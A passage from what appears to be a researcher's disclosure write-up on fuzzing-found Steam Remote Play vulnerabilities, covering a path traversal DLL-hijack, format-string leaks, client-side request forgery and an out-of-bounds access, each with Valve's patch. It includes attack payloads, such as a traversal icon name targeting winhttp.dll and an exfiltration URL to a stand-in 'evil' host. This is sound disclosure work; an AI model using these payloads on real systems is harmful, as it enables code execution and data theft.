style=text-align:left><code>CRemotePlayTogetherGroupUpdateMsg</code> format string bugs</td><td style=text-align:left>Remote memory leak</td></tr><tr><td style=text-align:left><code>CRemotePlayTogetherGroupUpdateMsg</code> request forgery</td><td style=text-align:left>Info leak / pivot</td></tr><tr><td style=text-align:left><code>CRemotePlayTogetherGroupUpdateMsg</code> out-of-bounds access</td><td style=text-align:left>Type confusion</td></tr><tr><td style=text-align:left>Video channel YV12 data heap overflow</td><td style=text-align:left>Remote (?) heap leak</td></tr><tr><td style=text-align:left><code>CRemoteHIDMsg</code> gamepad input report heap overflow</td><td style=text-align:left>Unknown</td></tr></tbody></table><h2 id=path-traversal-file-write-in-csettouchicondatamsg>Path traversal file write in <code>CSetTouchIconDataMsg</code></h2><p>This vulnerability is a perfect example of the <em>&ldquo;fuzzing is not only about crashes&rdquo;</em> rule: side effects of fuzzing on the system can also reveal bugs.</p><p>Here, we can see that weird-looking files with random (mutated) names and contents were created inside the client&rsquo;s <code>SteamLink</code> application data folder:</p><p><a href=/posts/img/remoteplay/touchicon-files.png target=_blank><img src=/posts/img/remoteplay/touchicon-files.png alt="Weird-looking files in SteamLink folder&amp;hellip;"></a></p><p>Fun fact: I only noticed these files by chance 5 months after their creation, which means this vulnerability could have been long fixed at the moment of my SSTIC talk&mldr;</p><p><code>CSetTouchIconDataMsg</code> is a control message that allows the host of a Remote Play session to synchronize image files, such as controller binding icons originating from <code>C:\Program Files (x86)\Steam\tenfoot\resource\images\library\controller\binding_icons</code>. The icons are then downloaded into <code>%APPDATA%\Valve Corporation\SteamLink</code>.</p><p>The protobuf definition for this message type is the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CSetTouchIconDataMsg</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> appid <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> icon <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bytes</span> data <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>When the client receives an <code>icon</code> field that starts with <code>"@"</code>, it is first MD5-hashed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> (icon_name[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;@&#39;</span>) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>MD5_Init</span>(<span style=color:#f92672>&amp;</span>ctx);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>MD5_Update</span>(<span style=color:#f92672>&amp;</span>ctx, <span style=color:#f92672>&amp;</span>appid, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>MD5_Update</span>(<span style=color:#f92672>&amp;</span>ctx, icon_name, <span style=color:#a6e22e>strlen</span>(icon_name));
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>MD5_Final</span>(<span style=color:#f92672>&amp;</span>ctx, <span style=color:#f92672>&amp;</span>path);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>However, if the icon name does not start with <code>"@"</code>, the client directly uses it as a relative path for a file write inside the <code>SteamLink</code> application data folder. The host therefore fully controls the name of the file to write (<code>icon</code>), but also the contents that are written to this file (<code>data</code>).</p><p>An attacker can abuse this fact to write an arbitrary file on the victim&rsquo;s file system by leveraging path traversal. Files can even be overwritten, and folders created recursively if they do not exist.</p><p>From there, many techniques can be applied to achieve <strong>remote code execution</strong>. I chose to illustrate the vulnerability with a basic DLL hijack.</p><p>Using Process Monitor, one can notice that the Steam client attempts to load <code>winhttp.dll</code>, a DLL that is not found inside the Steam folder and thus fetched from System32.</p><p>By sending the icon string <code>../../../../../../Program Files (x86)/Steam/winhttp.dll</code>, we can create an arbitrary DLL inside the victim&rsquo;s Steam folder. When the streaming client (or Steam) restarts, it will load the hijacked DLL: arbitrary code can then be executed.</p><p>Here is a video proof-of-concept:</p><video class=video-shortcode preload controls width=100%>
<source src=/posts/img/remoteplay/touchicon-poc.webm type=video/webm></video><p>The video shows both the attacker&rsquo;s computer and the victim&rsquo;s. The attacker invites the victim to a Remote Play session in the game <em>Ultimate Tic-Tac-Toe</em>. Note: here the victim is a friend, but this is not necessary; the attacker could have generated an invite link and sent it to anyone.</p><p>Once the session is established, the attacker silently delivers the payload by injecting a DLL into their own Steam process. Then, the victim is kicked out of the session. When they restart the Steam client, <code>calc.exe</code> shows up instead.</p><p>Valve patched the vulnerability by ensuring all icon names are MD5-hashed, independently of the first character being a <code>"@"</code> or not.</p><h2 id=format-string-bugs-in-cremoteplaytogethergroupupdatemsg>Format string bugs in <code>CRemotePlayTogetherGroupUpdateMsg</code></h2><p>Earlier, this message type was given as an example of a rather complex message type that could conceal many bugs. Well, this was done on purpose, because it is really full of bugs: the three next vulnerabilities we are going to cover all target this structure.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CRemotePlayTogetherGroupUpdateMsg</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>message</span> <span style=color:#a6e22e>Player</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> accountid <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> guestid <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> keyboard_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> mouse_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> controller_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>repeated</span> <span style=color:#66d9ef>uint32</span> controller_slots <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bytes</span> avatar_hash <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	}<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>repeated</span> <span style=color:#f92672>.</span>CRemotePlayTogetherGroupUpdateMsg.Player players <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>int32</span> player_index <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> miniprofile_location <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> game_name <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> avatar_location <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>This message is basically sent by the session host to notify the guest of various things: who are the players in the current session, where are their avatars stored, etc.</p><p><a href=/posts/img/remoteplay/rpt-group-update.png target=_blank><img src=/posts/img/remoteplay/rpt-group-update.png alt></a></p><p>There are <strong>two distinct format string vulnerabilities</strong> in the code that handles this message.</p><p>In the <code>CMiniProfileLoader::LoadProfiles</code> function, a loop iterates over the <code>players</code> list.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>while</span> (n_players<span style=color:#f92672>--</span>) {
</span></span><span style=display:flex><span>  Player <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>Players<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (Player<span style=color:#f92672>-&gt;</span>accountid) {
</span></span><span style=display:flex><span>    CMiniProfileLoader<span style=color:#f92672>::</span>LoadAccountProfile(
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>this</span>,
</span></span><span style=display:flex><span>      RemotePlayTogetherGroupUpdateMsg<span style=color:#f92672>-&gt;</span>miniprofile_location,
</span></span><span style=display:flex><span>      Player<span style=color:#f92672>-&gt;</span>accountid
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (Player<span style=color:#f92672>-&gt;</span>guestid) {
</span></span><span style=display:flex><span>    binarytohex(Player<span style=color:#f92672>-&gt;</span>avatar_hash, avatar_hash_size, hash_hex, <span style=color:#ae81ff>41</span>);
</span></span><span style=display:flex><span>    CUtlString<span style=color:#f92672>::</span>Format(
</span></span><span style=display:flex><span>      url,
</span></span><span style=display:flex><span>      RemotePlayTogetherGroupUpdateMsg<span style=color:#f92672>-&gt;</span>avatar_location,
</span></span><span style=display:flex><span>      hash_hex,
</span></span><span style=display:flex><span>      hash_hex
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>    CMiniProfileLoader<span style=color:#f92672>::</span>LoadGuestProfile(<span style=color:#66d9ef>this</span>, url, Player<span style=color:#f92672>-&gt;</span>guestid);
</span></span><span style=display:flex><span>    free(url);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>When an <code>accountid</code> field is provided in the current player object in the list, the <code>CMiniProfileLoader::LoadAccountProfile</code> method eventually calls:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>CUtlFmtString<span style=color:#f92672>::</span>CUtlFmtString(url, miniprofile_location, accountid);
</span></span></code></pre></div><p><strong>The <code>miniprofile_location</code> field is naively used as a string formatter</strong>, which is controlled by the attacker (host). They also control the first argument to the format string (<code>accountid</code>).</p><p>Therefore, the host can leak arbitrary memory from the process, using formatters such as <code>%x</code> and <code>%s</code> (unfortunately, the <code>%n</code> formatter is disabled by default, thus no write primitive).</p><p>The formatted string is then later used as a URL and a CURL request is performed.</p><p>There are two ways the attacker can retrieve back the formatted string:</p><ol><li>Exfiltrate over HTTP (e.g. set <code>miniprofile_location</code> to <code>http://evil/%x</code> and log the request);</li><li>Read received debug strings over the <em>Stats</em> channel (0x2).</li></ol><p>The second option is the easiest one to carry out since it happens automatically. Indeed, by setting the <code>miniprofile_location</code>
field to <code>"Leak: %08x.%08x.%08x.%08x"</code>, the CURL request fails and a debug string that looks like the following is output:</p><pre tabindex=0><code>DebugString: &#34;Web request Leak: 13374242.11fe0ff0.11fe0fec.13374242 failed, CURL error code 3, HTTP error code 0&#34;
</code></pre><p>We haven&rsquo;t talked about the <em>Stats</em> channel much yet. It implements a few message types:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>enum</span> EStreamStatsMessage {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    k_EStreamStatsFrameEvents <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    k_EStreamStatsDebugDump <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    k_EStreamStatsLogMessage <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    k_EStreamStatsLogUploadBegin <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    k_EStreamStatsLogUploadData <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    k_EStreamStatsLogUploadComplete <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>In this channel exists a type of message used to send over log messages: <code>k_EStreamStatsLogMessage</code>, which protobuf
definition is the following.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CLogMsg</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>int32</span> type <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>    <span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> <span style=color:#66d9ef>message</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>The streaming client happens to <strong>always automatically send all the debug strings over to the host</strong> via this channel and message! They&rsquo;re even in plaintext.</p><p>Thus, the attacker retrieves the leaks without effort.</p><p>The second format string vulnerability is highly similar to the first one. When <code>guestid</code> is set, the following call is performed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>CUtlString<span style=color:#f92672>::</span>Format(
</span></span><span style=display:flex><span>  url,
</span></span><span style=display:flex><span>  RemotePlayTogetherGroupUpdateMsg<span style=color:#f92672>-&gt;</span>avatar_location,
</span></span><span style=display:flex><span>  hash_hex,
</span></span><span style=display:flex><span>  hash_hex
</span></span><span style=display:flex><span>);
</span></span></code></pre></div><p>Again, <code>avatar_location</code> is a host-controlled field and is used as a string formatter. Since the formatted string is also used as a URL inside a CURL request, the same exfiltration techniques as before apply.</p><p>In terms of impact, these vulnerabilities allow an attacker to reliably and fully break ASLR on the victim&rsquo;s machine, which is very often the first step to a memory corruption exploit.</p><p>More particularly on Windows, breaking ASLR for various Steam-related DLLs (such as <code>steamclient.dll</code>) or other Windows DLLs can greatly help to further compromise the system in any other attack targeting the Steam client.</p><p>An attacker could also practically leak anything in the process&rsquo; memory, including potentially sensitive data (environment variables, paths, tokens&mldr;).</p><p>Valve patched these vulnerabilities by denying URLs that contain the character <code>'%'</code>.</p><h2 id=request-forgery-in-cremoteplaytogethergroupupdatemsg>Request forgery in <code>CRemotePlayTogetherGroupUpdateMsg</code></h2><p>This vulnerability is a direct follow-up to the previous one.</p><p>Since the <code>miniprofile_location</code> field is a fully host-controlled URL, <strong>an attacker can make the client perform an arbitrary HTTP(S) GET request</strong> (sadly, other wrappers such as <code>file://</code> are disabled by the CURL options set in the client).</p><p>At this point, the client expects the CURL response to be a valid JSON file, which will in turn be parsed. However, if the response is <strong>not</strong> a valid JSON string, the following debug string will be output and sent back to the attacker:</p><pre tabindex=0><code>&#34;Couldn&#39;t parse profile data: syntax error at line 1 near: &lt;RESPONSE CONTENTS&gt;&#34;
</code></pre><p>An attacker can exfiltrate the response to any HTTP GET request performed client-side! As long as the output is not JSON, of course.</p><p>This gives a so-called SSRF primitive (server side request forgery), but here I would rather call it a CSRF because the vulnerability lies on the client&rsquo;s side — although the acronym CSRF is usually &ldquo;reserved&rdquo; for the <em>cross-site request forgery</em> web vulnerability&mldr;</p><p>With such a primitive, an attacker could leak potentially sensitive data hosted on local web pages or over an internal network. They could also scan the victim&rsquo;s internal network for recon (IP ranges, port scan).</p><p>If a vulnerable internal service is found, an attacker could even pivot by exploiting it through GET requests (e.g. SQL injection in GET parameter): the possibilities are endless.</p><p>Just for fun, we can try going a little deeper. I said the client expects a JSON string from the response, but what kind? Since the attacker controls it, it could be an additional attack vector.</p><p>It appears that the client expects a JSON like the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;avatar_url&#34;</span>: <span style=color:#e6db74>&#34;http://site/toto.png&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;persona_name&#34;</span>: <span style=color:#e6db74>&#34;xyz&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The client will then download the avatar and put it in local storage (usually in <code>%AppData%\Roaming\Valve Corporation\SteamLink</code>). For instance, <code>toto.png</code> will be saved to <code>avatars/to/toto.png</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>CUtlFmtString<span style=color:#f92672>::</span>CUtlFmtString(v14, <span style=color:#e6db74>&#34;%s/avatars/%.2s/%s&#34;</span>, StoragePath, filename, filename);
</span></span></code></pre></div><p>Unfortunately, there is no way to inject a <code>"/"</code> or <code>"\"</code> to perform path traversal here. Best I could do is write a file to the parent folder: with a filename like <code>..toto.txt</code>, the saved file will be <code>avatars/../..toto.txt</code>, so <code>..toto.txt</code> will end up in the local storage root folder. But since in this case the filename starts with <code>..</code>, we won&rsquo;t be able to override any interesting configuration file.</p><p>One may also drop a malicious file inside the avatars folder, but there is no way to execute it. You could also create a folder using an NTFS alternate data stream like <code>toto::$INDEX_ALLOCATION</code> (a lesser-known trick&mldr; but pointless).</p><p>Valve patched this vulnerability by introducing a whitelist domain filter.</p><h2 id=oob-access-in-cremoteplaytogethergroupupdatemsg>OOB access in <code>CRemotePlayTogetherGroupUpdateMsg</code></h2><p>This bug resides yet again in the <code>CRemotePlayTogetherGroupUpdateMsg</code> message, but this time, in the <code>player_index</code> field:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-protobuf data-lang=protobuf><span style=display:flex><span><span style=color:#66d9ef>message</span> <span style=color:#a6e22e>CRemotePlayTogetherGroupUpdateMsg</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>message</span> <span style=color:#a6e22e>Player</span> {<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> accountid <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>uint32</span> guestid <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> keyboard_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> mouse_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bool</span> controller_enabled <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>repeated</span> <span style=color:#66d9ef>uint32</span> controller_slots <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>		<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>bytes</span> avatar_hash <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	}<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>repeated</span> <span style=color:#f92672>.</span>CRemotePlayTogetherGroupUpdateMsg.Player players <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>int32</span> player_index <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;   <span style=color:#75715e>// &lt;---
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> miniprofile_location <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> game_name <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>	<span style=color:#66d9ef>optional</span> <span style=color:#66d9ef>string</span> avatar_location <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>;<span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>}<span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>As you can see, <code>player_index</code> is a signed 32-bit integer. It is used to notify the client of which index in the <code>players</code> list corresponds to the host player in the session.</p><p>In order to reproduce this bug, the host must send two messages:</p><ol><li>The <code>CRemotePlayTogetherGroupUpdateMsg</code> with a large enough <code>player_index</code>;</li><li>A certain <code>CSetStreamingClientConfig</code> message that will actually trigger the bug.</li></ol><p>Indeed, sending a certain <code>CSetStreamingClientConfig</code> message to the client (which I didn&rsquo;t exactly characterize — I only replayed the same message that my fuzzer stumbled upon) causes the <code>CRemotePlayTogetherDialog::Update</code> method to be called:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>do</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Player <span style=color:#f92672>=</span> Players[k];
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  is_host <span style=color:#f92672>=</span> k <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>player_index;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( k <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>n_players <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>player_index <span style=color:#f92672>&gt;</span> k ) {
</span></span><span style=display:flex><span>    is_host <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    Player <span style=color:#f92672>=</span> Players[<span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>player_index];
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  CRemotePlayTogetherDialog<span style=color:#f92672>::</span>UpdatePlayerState(
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>,
</span></span><span style=display:flex><span>    <span style=color:#75715e>/* ... */</span>,
</span></span><span style=display:flex><span>    Player,
</span></span><span style=display:flex><span>    is_host
</span></span><span style=display:flex><span>  );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>while</span> ( <span style=color:#f92672>++</span>k <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>-&gt;</span>n_players );
</span></span></code></pre></div><p>There is basically a loop over a list of players. The <code>Player</code> variable should be a valid pointer to a <code>CRemotePlayTogetherGroupUpdateMsg_Player</code> structure that represents a player, especially when it is passed over to <code>CRemotePlayTogetherDialog::UpdatePlayerState</code>.</p><p>It turns out that <code>this->player_index</code> is the <code>player_index</code> value from the latest seen <code>CRemotePlayTogetherGroupUpdateMsg</code> message, which the attacker controls.</p><p>At the last loop iteration, since <code>this->player_index > k</code> is a signed comparison, the attacker can only enter the highlighted branch if <code>player_index</code> is a <em>positive</em> signed integer. But other than that, verifying the condition is trivial and leaves a lot of room to go out of bounds, relatively to the start of the players vector.</p><p>Even better: if through <code>CRemotePlayTogetherGroupUpdateMsg</code> the attacker has never sent a list of players before, then <code>Players</code> is NULL, and this fact is never checked. Since the client lives in a 32-bit process, the attacker can pretty much point to anywhere in memory.</p><p>This effectively leads to type confusion: we could fake a <em>Player</em> structure somewhere in memory (maybe with some heap spraying) and given an ASLR leak, fake the <code>Player</code> object that is passed to the <code>UpdatePlayerState</code> method.</p><p>If this latter function wrote to fields of the <code>Player</code> structure, this would give an arbitrary write primitive.</p><p><a href=/posts/img/remoteplay/rpt-integer-overflow.png target=_blank><img src=/posts/img/remoteplay/rpt-integer-overflow.png alt="Integer overflow in <code>CRemotePlayTogetherGroupUpdateMsg</code>"></a></p><p>Unfortunately, the <code>UpdatePlayerState</code> method doesn&rsquo;t do anything really interesting with the <code>Player</code> structure: barely a few read accesses (that are in turn not used for any other write access).</p><p>Still, this bug highlights how some bugs can be stateful, and how fuzzing many message types at once can help uncover those.</p><h2 id=heap-overflow-in-yv12-video-frames>Heap overflow in YV12 video frames</h2><p>We saw that in order to transmit audio and video data, several 